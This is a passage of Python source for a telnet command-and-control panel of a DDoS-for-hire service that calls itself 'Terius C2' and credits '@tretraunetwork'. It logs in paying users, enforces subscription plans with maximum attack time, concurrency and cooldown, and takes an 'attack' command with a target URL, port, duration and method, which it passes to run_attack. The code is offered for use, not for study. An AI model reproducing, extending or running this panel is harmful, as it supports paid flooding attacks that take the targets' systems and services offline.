          \033[1;36m\x1b[38;2;252;4;4m╔\x1b[38;2;252;8;8m═\x1b[38;2;252;11;11m═\x1b[38;2;252;15;15m═\x1b[38;2;252;18;18m═\x1b[38;2;252;21;21m═\x1b[38;2;252;25;25m═\x1b[38;2;252;28;28m═\x1b[38;2;252;32;32m═\x1b[38;2;252;35;35m═\x1b[38;2;252;39;39m═\x1b[38;2;252;42;42m═\x1b[38;2;252;45;45m═\x1b[38;2;252;49;49m═\x1b[38;2;252;52;52m═\x1b[38;2;252;56;56m═\x1b[38;2;252;59;59m═\x1b[38;2;252;63;63m═\x1b[38;2;252;66;66m═\x1b[38;2;252;69;69m═\x1b[38;2;252;73;73m═\x1b[38;2;252;76;76m═\x1b[38;2;252;80;80m═\x1b[38;2;252;83;83m═\x1b[38;2;253;87;87m═\x1b[38;2;253;90;90m═\x1b[38;2;253;93;93m╗\x1b[38;2;253;97;97m╔\x1b[38;2;253;100;100m═\x1b[38;2;253;104;104m═\x1b[38;2;253;107;107m═\x1b[38;2;253;111;111m═\x1b[38;2;253;114;114m═\x1b[38;2;253;117;117m═\x1b[38;2;253;121;121m═\x1b[38;2;253;124;124m═\x1b[38;2;253;128;128m═\x1b[38;2;253;131;131m═\x1b[38;2;253;135;135m═\x1b[38;2;253;138;138m═\x1b[38;2;253;141;141m═\x1b[38;2;253;145;145m═\x1b[38;2;253;148;148m═\x1b[38;2;253;152;152m═\x1b[38;2;253;155;155m═\x1b[38;2;253;159;159m═\x1b[38;2;253;162;162m═\x1b[38;2;253;165;165m═\x1b[38;2;253;169;169m═\x1b[38;2;254;172;172m═\x1b[38;2;254;176;176m═\x1b[38;2;254;179;179m═\x1b[38;2;254;183;183m═\x1b[38;2;254;186;186m═\x1b[38;2;254;189;189m═\x1b[38;2;254;193;193m═\x1b[38;2;254;196;196m═\x1b[38;2;254;200;200m═\x1b[38;2;254;203;203m═\x1b[38;2;254;207;207m═\x1b[38;2;254;210;210m═\x1b[38;2;254;213;213m═\x1b[38;2;254;217;217m═\x1b[38;2;254;220;220m═\x1b[38;2;254;224;224m═\x1b[38;2;254;227;227m═\x1b[38;2;254;231;231m═\x1b[38;2;254;234;234m═\x1b[38;2;254;237;237m═\x1b[38;2;254;241;241m═\x1b[38;2;254;244;244m═\x1b[38;2;254;248;248m═\x1b[38;2;254;251;251m╗\x1b[38;2;255;255;255m\033[0m
          \033[1;36m\x1b[38;2;252;4;4m║\033[0m ALL SYMBOLS IN THE MENU \033[1;36m\x1b[38;2;253;93;93m║\033[1;36m\x1b[38;2;253;93;93m║\033[0m WRITE IN LOWER CASE TO USE METHODS,....    \033[1;36m\x1b[38;2;254;251;251m║
          \033[1;36m\x1b[38;2;252;4;4m║\033[0m \x1b[38;5;1m[\033[0mH\x1b[38;5;1m]\033[0m HTTPS METHODS       \033[1;36m\x1b[38;2;253;93;93m║\033[1;36m\x1b[38;2;253;93;93m║\033[0m JOIN NOW @tretraunetwork FOR MORE UPDATES  \033[1;36m\x1b[38;2;254;251;251m║
          \033[1;36m\x1b[38;2;252;4;4m║\033[0m \x1b[38;5;1m[\033[0mS\x1b[38;5;1m]\033[0m SCRIPT INFORMATION  \033[1;36m\x1b[38;2;253;93;93m║\033[1;36m\x1b[38;2;253;93;93m║\033[0m IF YOU FIND AN ERROR, PLEASE CONTACT ADMIN \033[1;36m\x1b[38;2;254;251;251m║
          \033[1;36m\x1b[38;2;252;4;4m╚\x1b[38;2;252;8;8m═\x1b[38;2;252;11;11m═\x1b[38;2;252;15;15m═\x1b[38;2;252;18;18m═\x1b[38;2;252;21;21m═\x1b[38;2;252;25;25m═\x1b[38;2;252;28;28m═\x1b[38;2;252;32;32m═\x1b[38;2;252;35;35m═\x1b[38;2;252;39;39m═\x1b[38;2;252;42;42m═\x1b[38;2;252;45;45m═\x1b[38;2;252;49;49m═\x1b[38;2;252;52;52m═\x1b[38;2;252;56;56m═\x1b[38;2;252;59;59m═\x1b[38;2;252;63;63m═\x1b[38;2;252;66;66m═\x1b[38;2;252;69;69m═\x1b[38;2;252;73;73m═\x1b[38;2;252;76;76m═\x1b[38;2;252;80;80m═\x1b[38;2;252;83;83m═\x1b[38;2;253;87;87m═\x1b[38;2;253;90;90m═\x1b[38;2;253;93;93m╝\x1b[38;2;253;97;97m╚\x1b[38;2;253;100;100m═\x1b[38;2;253;104;104m═\x1b[38;2;253;107;107m═\x1b[38;2;253;111;111m═\x1b[38;2;253;114;114m═\x1b[38;2;253;117;117m═\x1b[38;2;253;121;121m═\x1b[38;2;253;124;124m═\x1b[38;2;253;128;128m═\x1b[38;2;253;131;131m═\x1b[38;2;253;135;135m═\x1b[38;2;253;138;138m═\x1b[38;2;253;141;141m═\x1b[38;2;253;145;145m═\x1b[38;2;253;148;148m═\x1b[38;2;253;152;152m═\x1b[38;2;253;155;155m═\x1b[38;2;253;159;159m═\x1b[38;2;253;162;162m═\x1b[38;2;253;165;165m═\x1b[38;2;253;169;169m═\x1b[38;2;254;172;172m═\x1b[38;2;254;176;176m═\x1b[38;2;254;179;179m═\x1b[38;2;254;183;183m═\x1b[38;2;254;186;186m═\x1b[38;2;254;189;189m═\x1b[38;2;254;193;193m═\x1b[38;2;254;196;196m═\x1b[38;2;254;200;200m═\x1b[38;2;254;203;203m═\x1b[38;2;254;207;207m═\x1b[38;2;254;210;210m═\x1b[38;2;254;213;213m═\x1b[38;2;254;217;217m═\x1b[38;2;254;220;220m═\x1b[38;2;254;224;224m═\x1b[38;2;254;227;227m═\x1b[38;2;254;231;231m═\x1b[38;2;254;234;234m═\x1b[38;2;254;237;237m═\x1b[38;2;254;241;241m═\x1b[38;2;254;244;244m═\x1b[38;2;254;248;248m═\x1b[38;2;254;251;251m╝\x1b[38;2;255;255;255m\033[0m

 Tips : {random.choice(lol)}[0m\n""")
def handle_client(client_socket, addr, db_data):
    send(client_socket, clear, False)
    send(client_socket, "Enter UserName: ", False)
    usernamex = client_socket.recv(1024).decode().strip()
    send(client_socket, "Enter Password: ", False)
    password = client_socket.recv(1024).decode().strip()
    user_plan_data = next((plan for plan in db_data["user_plan"] if plan["username"] == usernamex and plan["password"] == password), None)
    if not user_plan_data:
        send(client_socket, "Incorrect UserName or Password!")
        client_socket.close()
        return

    expiry_date = datetime.strptime(user_plan_data["expiry"], "%Y-%m-%d")
    if expiry_date < datetime.now():
        send(client_socket, "Your account has expired!")
        if datetime.now() >= expiry_date.replace(day=expiry_date.day + 1):
            db_data["user_plan"] = [plan for plan in db_data["user_plan"] if plan["username"] != usernamex]
            save_config(db_data)
        client_socket.close()
        return

    is_admin = user_plan_data["plan"] == "Admin"
    ducc(client_socket, usernamex)
    prompt = f"\x1b[38;5;0m\x1b[48;2;3;252;28mT\x1b[48;2;3;250;35me\x1b[48;2;3;248;43mr\x1b[48;2;3;246;51mi\x1b[48;2;3;244;58mu\x1b[48;2;3;242;66ms\x1b[48;2;3;240;74m \x1b[48;2;3;238;82mC\x1b[48;2;3;236;89m2\x1b[48;2;3;234;97m \x1b[48;2;3;232;105m/\x1b[48;2;3;230;112m/\x1b[48;2;3;228;120m \x1b[48;2;3;226;128m@\x1b[48;2;3;224;136mt\x1b[48;2;3;222;143mr\x1b[48;2;3;220;151me\x1b[48;2;3;218;159mt\x1b[48;2;3;216;167mr\x1b[48;2;3;214;174ma\x1b[48;2;3;212;182mu\x1b[48;2;3;210;190mn\x1b[48;2;3;208;197me\x1b[48;2;3;206;205mt\x1b[48;2;3;204;213mw\x1b[48;2;3;202;221mo\x1b[48;2;3;200;228mr\x1b[48;2;3;198;236mk\x1b[48;2;3;196;244m \x1b[48;2;3;194;252m\033[0m: "
    send(client_socket, prompt, False)

    bots.append(client_socket)

    try:
        while True:
            cnc = client_socket.recv(1024).decode().strip()
            if not cnc:
                send(client_socket, prompt, False)
                continue

            cmd_parts = cnc.split()
            command = cmd_parts[0].lower()
            if command == "addnew" or command == "add":
                if not is_admin:
                    send(client_socket, "Error: You don't have permission to perform this action. Admin plan required.")
                else:
                    with open('database.json', 'r') as f:
                        db_data = json.load(f)
        
                    add_plan(client_socket, db_data)
        
                    with open('database.json', 'w') as f:
                        json.dump(db_data, f, indent=4)

            elif command == "removenew" or command == "rm":
                if not is_admin:
                    send(client_socket, "Error: You don't have permission to perform this action. Admin plan required.")
                else:
                    send(client_socket, "Enter username to remove: ", False)
                    remove_username = client_socket.recv(1024).decode().strip()
        
                    with open('database.json', 'r') as f:
                        db_data = json.load(f)
       
                    user_plan_data = next((plan for plan in db_data["user_plan"] if plan["username"] == remove_username), None)
        
                    if user_plan_data:
                        plan = user_plan_data["plan"]
                        send(client_socket, f"Plan for {remove_username} is {plan}. Proceeding with removal.", False)

                        initial_len = len(db_data["user_plan"])
                        db_data["user_plan"] = [plan for plan in db_data["user_plan"] if plan["username"] != remove_username]
            
                        if len(db_data["user_plan"]) < initial_len:
                            with open('database.json', 'w') as f:
                                json.dump(db_data, f, indent=4)
                            send(client_socket, f"Plan for {remove_username} removed successfully.")
                        else:
                            send(client_socket, f"No plan found for {remove_username}.")
                    else:
                        send(client_socket, f"No plan found for {remove_username}.")
            elif command == "exit":
                break
            elif command in ["cls", "clear"]:
                send(client_socket, clear, False)
                ducc(client_socket, usernamex)
            elif command == "start":
                send(client_socket, "Hello Everyone")
            elif command in ["mth","method","methods"]:
                send(client_socket, clear, False)
                mth(client_socket, usernamex)
            elif command== "help":
                send(client_socket, clear, False)
                help(client_socket, usernamex)
            
            elif command == "attack" and len(cmd_parts) == 5:
                method, url, port, time_value = cmd_parts[1:]
                try:
                    port, time_value = int(port), int(time_value)

                    user_plan_data = next((plan for plan in db_data["user_plan"] if plan["username"] == usernamex), None)
                    if not user_plan_data:
                        send(client_socket, "User plan not found.")
                        continue

                    plan_name = user_plan_data["plan"]
                    plan_data = db_data["plans"].get(plan_name)
                    if not plan_data:
                        send(client_socket, f"Invalid plan: {plan_name}")
                        continue

                    allowed_methods = plan_data["methods"]
                    if method not in allowed_methods:
                        send(client_socket, f"Method {method} not allowed for your plan ({plan_name}).")
                        continue
            
                    if time_value > plan_data["max_time"]:
                        send(client_socket, f"Time exceeds your plan's max time ({plan_data['max_time']}s).")
                        continue

                    ongoing_tasks = [task for task in get_ongoing() if task["username"] == usernamex]
                    if len(ongoing_tasks) >= plan_data["max_conc"]:
                        send(client_socket, f"Max concurrent attacks reached ({plan_data['max_conc']})")
                        continue

                    on_cooldown, remaining = is_user_on_cooldown(usernamex)
                    if on_cooldown:
                        send(client_socket, f"You are on cooldown. Wait {remaining:.2f} seconds.")
                        continue

                    if run_attack(method, url, port, time_value):
                        add_task(usernamex, method, url, port, time_value, plan_data["cooldown"])
                        send(client_socket, clear, False)
                        gay(client_socket, usernamex)
    
                        send(client_socket, f"""
                    \033[1;36m\x1b[38;2;79;4;255m╔\x1b[38;2;85;13;255m╦\x1b[38;2;92;23;255m╗\x1b[38;2;98;32;255m╔\x1b[38;2;105;41;255m═\x1b[38;2;111;51;255m╗\x1b[38;2;118;60;255m╦\x1b[38;2;124;69;255m═\x1b[38;2;131;78;255m╗\x1b[38;2;137;88;255m╦\x1b[38;2;144;97;255m╦\x1b[38;2;150;106;255m \x1b[38;2;157;115;255m╦\x1b[38;2;163;125;255m╔\x1b[38;2;170;134;255m═\x1b[38;2;176;143;255m╗\x1b[38;2;183;153;255m \x1b[38;2;189;162;255m \x1b[38;2;196;171;255m╔\x1b[38;2;202;180;255m═\x1b[38;2;209;190;255m╗\x1b[38;2;215;199;255m╔\x1b[38;2;222;208;255m╗\x1b[38;2;228;217;255m╔\x1b[38;2;235;227;255m╔\x1b[38;2;241;236;255m═\x1b[38;2;248;245;255m╗\x1b[38;2;255;255;255m
                     \033[1;36m\x1b[38;2;79;4;255m║\x1b[38;2;86;14;255m \x1b[38;2;92;24;255m║\x1b[38;2;99;33;255m╣\x1b[38;2;106;43;255m \x1b[38;2;113;52;255m╠\x1b[38;2;119;62;255m╦\x1b[38;2;126;72;255m╝\x1b[38;2;133;81;255m║\x1b[38;2;140;91;255m║\x1b[38;2;146;101;255m \x1b[38;2;153;110;255m║\x1b[38;2;160;120;255m╚\x1b[38;2;167;129;255m═\x1b[38;2;173;139;255m╗\x1b[38;2;180;149;255m \x1b[38;2;187;158;255m \x1b[38;2;194;168;255m║\x1b[38;2;200;178;255m \x1b[38;2;207;187;255m \x1b[38;2;214;197;255m║\x1b[38;2;221;206;255m║\x1b[38;2;227;216;255m║\x1b[38;2;234;226;255m║\x1b[38;2;241;235;255m \x1b[38;2;248;245;255m \x1b[38;2;255;254;255m\033[0m
                    \033[1;36m\x1b[38;2;79;4;255m \x1b[38;2;85;13;255m╩\x1b[38;2;92;23;255m \x1b[38;2;98;32;255m╚\x1b[38;2;105;41;255m═\x1b[38;2;111;51;255m╝\x1b[38;2;118;60;255m╩\x1b[38;2;124;69;255m╚\x1b[38;2;131;78;255m═\x1b[38;2;137;88;255m╩\x1b[38;2;144;97;255m╚\x1b[38;2;150;106;255m═\x1b[38;2;157;115;255m╝\x1b[38;2;163;125;255m╚\x1b[38;2;170;134;255m═\x1b[38;2;176;143;255m╝\x1b[38;2;183;153;255m \x1b[38;2;189;162;255m \x1b[38;2;196;171;255m╚\x1b[38;2;202;180;255m═\x1b[38;2;209;190;255m╝\x1b[38;2;215;199;255m╝\x1b[38;2;222;208;255m╚\x1b[38;2;228;217;255m╝\x1b[38;2;235;227;255m╚\x1b[38;2;241;236;255m═\x1b[38;2;248;245;255m╝\x1b[38;2;255;255;255m\033[0m
              Attack Command Sent Successfully To Server 
           \033[1;36m\x1b[38;2;77;2;255m╚\x1b[38;2;81;7;255m═\x1b[38;2;85;13;255m╦\x1b[38;2;88;18;255m═\x1b[38;2;92;23;255m═\x1b[38;2;96;28;255m═\x1b[38;2;99;34;255m═\x1b[38;2;103;39;255m═\x1b[38;2;107;44;255m═\x1b[38;2;111;49;255m═\x1b[38;2;114;55;255m═\x1b[38;2;118;60;255m═\x1b[38;2;122;65;255m═\x1b[38;2;125;70;255m═\x1b[38;2;129;76;255m═\x1b[38;2;133;81;255m═\x1b[38;2;136;86;255m═\x1b[38;2;140;92;255m═\x1b[38;2;144;97;255m═\x1b[38;2;147;102;255m═\x1b[38;2;151;107;255m═\x1b[38;2;155;113;255m═\x1b[38;2;159;118;255m═\x1b[38;2;162;123;255m═\x1b[38;2;166;128;255m═\x1b[38;2;170;134;255m═\x1b[38;2;173;139;255m═\x1b[38;2;177;144;255m═\x1b[38;2;181;149;255m═\x1b[38;2;184;155;255m═\x1b[38;2;188;160;255m═\x1b[38;2;192;165;255m═\x1b[38;2;195;170;255m═\x1b[38;2;199;176;255m═\x1b[38;2;203;181;255m═\x1b[38;2;207;186;255m═\x1b[38;2;210;191;255m═\x1b[38;2;214;197;255m═\x1b[38;2;218;202;255m═\x1b[38;2;221;207;255m═\x1b[38;2;225;212;255m═\x1b[38;2;229;218;255m═\x1b[38;2;232;223;255m═\x1b[38;2;236;228;255m═\x1b[38;2;240;233;255m═\x1b[38;2;243;239;255m╦\x1b[38;2;247;244;255m═\x1b[38;2;251;249;255m╝\x1b[38;2;255;255;255m\033[0m
         \033[1;36m\x1b[38;2;77;2;255m╔\x1b[38;2;81;7;255m═\x1b[38;2;84;12;255m═\x1b[38;2;88;17;255m═\x1b[38;2;91;22;255m╩\x1b[38;2;95;27;255m═\x1b[38;2;98;32;255m═\x1b[38;2;102;37;255m═\x1b[38;2;105;42;255m═\x1b[38;2;109;47;255m═\x1b[38;2;112;51;255m═\x1b[38;2;115;56;255m═\x1b[38;2;119;61;255m═\x1b[38;2;122;66;255m═\x1b[38;2;126;71;255m═\x1b[38;2;129;76;255m═\x1b[38;2;133;81;255m═\x1b[38;2;136;86;255m═\x1b[38;2;140;91;255m═\x1b[38;2;143;96;255m═\x1b[38;2;147;101;255m═\x1b[38;2;150;106;255m═\x1b[38;2;154;111;255m═\x1b[38;2;157;116;255m═\x1b[38;2;161;121;255m═\x1b[38;2;164;126;255m═\x1b[38;2;168;131;255m═\x1b[38;2;171;136;255m═\x1b[38;2;175;141;255m═\x1b[38;2;178;146;255m═\x1b[38;2;182;151;255m═\x1b[38;2;185;155;255m═\x1b[38;2;188;160;255m═\x1b[38;2;192;165;255m═\x1b[38;2;195;170;255m═\x1b[38;2;199;175;255m═\x1b[38;2;202;180;255m═\x1b[38;2;206;185;255m═\x1b[38;2;209;190;255m═\x1b[38;2;213;195;255m═\x1b[38;2;216;200;255m═\x1b[38;2;220;205;255m═\x1b[38;2;223;210;255m═\x1b[38;2;227;215;255m═\x1b[38;2;230;220;255m═\x1b[38;2;234;225;255m═\x1b[38;2;237;230;255m═\x1b[38;2;241;235;255m╩\x1b[38;2;244;240;255m═\x1b[38;2;248;245;255m═\x1b[38;2;251;250;255m╗\x1b[38;2;255;254;255m\033[0m
              Target     : {url}
              Port       : {port}
              Duration   : {time_value}
              Method     : {method}
              Account    : {usernamex}
         \033[1;36m\x1b[38;2;77;2;255m╚\x1b[38;2;81;7;255m═\x1b[38;2;84;12;255m═\x1b[38;2;88;17;255m═\x1b[38;2;91;22;255m═\x1b[38;2;95;27;255m═\x1b[38;2;98;32;255m═\x1b[38;2;102;37;255m═\x1b[38;2;105;42;255m═\x1b[38;2;109;47;255m═\x1b[38;2;112;51;255m═\x1b[38;2;115;56;255m═\x1b[38;2;119;61;255m═\x1b[38;2;122;66;255m═\x1b[38;2;126;71;255m═\x1b[38;2;129;76;255m═\x1b[38;2;133;81;255m═\x1b[38;2;136;86;255m═\x1b[38;2;140;91;255m═\x1b[38;2;143;96;255m═\x1b[38;2;147;101;255m═\x1b[38;2;150;106;255m═\x1b[38;2;154;111;255m═\x1b[38;2;157;116;255m═\x1b[38;2;161;121;255m═\x1b[38;2;164;126;255m═\x1b[38;2;168;131;255m═\x1b[38;2;171;136;255m═\x1b[38;2;175;141;255m═\x1b[38;2;178;146;255m═\x1b[38;2;182;151;255m═\x1b[38;2;185;155;255m═\x1b[38;2;188;160;255m═\x1b[38;2;192;165;255m═\x1b[38;2;195;170;255m═\x1b[38;2;199;175;255m═\x1b[38;2;202;180;255m═\x1b[38;2;206;185;255m═\x1b[38;2;209;190;255m═\x1b[38;2;213;195;255m═\x1b[38;2;216;200;255m═\x1b[38;2;220;205;255m═\x1b[38;2;223;210;255m═\x1b[38;2;227;215;255m═\x1b[38;2;230;220;255m═\x1b[38;2;234;225;255m═\x1b[38;2;237;230;255m═\x1b[38;2;241;235;255m═\x1b[38;2;244;240;255m═\x1b[38;2;248;245;255m═\x1b[38;2;251;250;255m╝\x1b[38;2;255;254;255m\033[0m
         \033[1;36m\x1b[38;2;77;2;255m╔\x1b[38;2;81;7;255m═\x1b[38;2;84;12;255m═\x1b[38;2;88;17;255m═\x1b[38;2;91;22;255m═\x1b[38;2;95;27;255m═\x1b[38;2;98;32;255m═\x1b[38;2;102;37;255m═\x1b[38;2;105;42;255m═\x1b[38;2;109;47;255m═\x1b[38;2;112;51;255m═\x1b[38;2;115;56;255m═\x1b[38;2;119;61;255m═\x1b[38;2;122;66;255m═\x1b[38;2;126;71;255m═\x1b[38;2;129;76;255m═\x1b[38;2;133;81;255m═\x1b[38;2;136;86;255m═\x1b[38;2;140;91;255m═\x1b[38;2;143;96;255m═\x1b[38;2;147;101;255m═\x1b[38;2;150;106;255m═\x1b[38;2;154;111;255m═\x1b[38;2;157;116;255m═\x1b[38;2;161;121;255m═\x1b[38;2;164;126;255m═\x1b[38;2;168;131;255m═\x1b[38;2;171;136;255m═\x1b[38;2;175;141;255m═\x1b[38;2;178;146;255m═\x1b[38;2;182;151;255m═\x1b[38;2;185;155;255m═\x1b[38;2;188;160;255m═\x1b[38;2;192;165;255m═\x1b[38;2;195;170;255m═\x1b[38;2;199;175;255m═\x1b[38;2;202;180;255m═\x1b[38;2;206;185;255m═\x1b[38;2;209;190;255m═\x1b[38;2;213;195;255m═\x1b[38;2;216;200;255m═\x1b[38;2;220;205;255m═\x1b[38;2;223;210;255m═\x1b[38;2;227;215;255m═\x1b[38;2;230;220;255m═\x1b[38;2;234;225;255m═\x1b[38;2;237;230;255m═\x1b[38;2;241;235;255m═\x1b[38;2;244;240;255m═\x1b[38;2;248;245;255m═\x1b[38;2;251;250;255m╗\x1b[38;2;255;254;255m\033[0m
              Plan       : {user_plan_data['plan']}
              Cooldown   : {plan_data['cooldown']}
              Max_Time   : {plan_data['max_time']}
              Concurrent : {plan_data['max_conc']}
         \033[1;36m\x1b[38;2;77;2;255m╚\x1b[38;2;81;7;255m═\x1b[38;2;84;12;255m═\x1b[38;2;88;17;255m═\x1b[38;2;91;22;255m═\x1b[38;2;95;27;255m═\x1b[38;2;98;32;255m═\x1b[38;2;102;37;255m═\x1b[38;2;105;42;255m═\x1b[38;2;109;47;255m═\x1b[38;2;112;51;255m═\x1b[38;2;115;56;255m═\x1b[38;2;119;61;255m═\x1b[38;2;122;66;255m═\x1b[38;2;126;71;255m═\x1b[38;2;129;76;255m═\x1b[38;2;133;81;255m═\x1b[38;2;136;86;255m═\x1b[38;2;140;91;255m═\x1b[38;2;143;96;255m═\x1b[38;2;147;101;255m═\x1b[38;2;150;106;255m═\x1b[38;2;154;111;255m═\x1b[38;2;157;116;255m═\x1b[38;2;161;121;255m═\x1b[38;2;164;126;255m═\x1b[38;2;168;131;255m═\x1b[38;2;171;136;255m═\x1b[38;2;175;141;255m═\x1b[38;2;178;146;255m═\x1b[38;2;182;151;255m═\x1b[38;2;185;155;255m═\x1b[38;2;188;160;255m═\x1b[38;2;192;165;255m═\x1b[38;2;195;170;255m═\x1b[38;2;199;175;255m═\x1b[38;2;202;180;255m═\x1b[38;2;206;185;255m═\x1b[38;2;209;190;255m═\x1b[38;2;213;195;255m═\x1b[38;2;216;200;255m═\x1b[38;2;220;205;255m═\x1b[38;2;223;210;255m═\x1b[38;2;227;215;255m═\x1b[38;2;230;220;255m═\x1b[38;2;234;225;255m═\x1b[38;2;237;230;255m═\x1b[38;2;241;235;255m═\x1b[38;2;244;240;255m═\x1b[38;2;248;245;255m═\x1b[38;2;251;250;255m╝\x1b[38;2;255;254;255m\033[0m
                         
  \033[0mTips : {random.choice(lol)}\033[0m\n""")
                    else:
                        send(client_socket, f"Failed to execute method {method}. Script not found.")
                except ValueError:
                    send(client_socket, "Port and time must be integers.")
            elif command == "ongoing":
                print_table_to_file()
                table_string = get_table_from_file()
                send(client_socket, table_string)
            elif command == "account" or command == "plan":
                send(client_socket, display_accounts(usernamex))
            elif command == "price":
                send(client_socket, display_prices(db_data))
            else:
                send(client_socket, "Unknown command.")

            send(client_socket, prompt, False)

    finally:
        bots.remove(client_socket)
        client_socket.close()

def main():
    config_data = load_config()
    db_data = load_database()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = config_data["server"]["host"]
    port = config_data["server"]["port"]
    server.bind((host, port))
    server.listen(5)
    print(f"Source By @phuvanduc // @tretraunetwork ")
    print(f"[+] CNC Server listening on {host}:{port}")
    print(f"Termux : telnet {host} {port}")

    threading.Thread(target=remove_expired_tasks, daemon=True).start()

    while True:
        client, addr = server.accept()
        threading.Thread(target=handle_client, args=(client, addr, db_data)).start()

if __name__ == "__main__":
    main()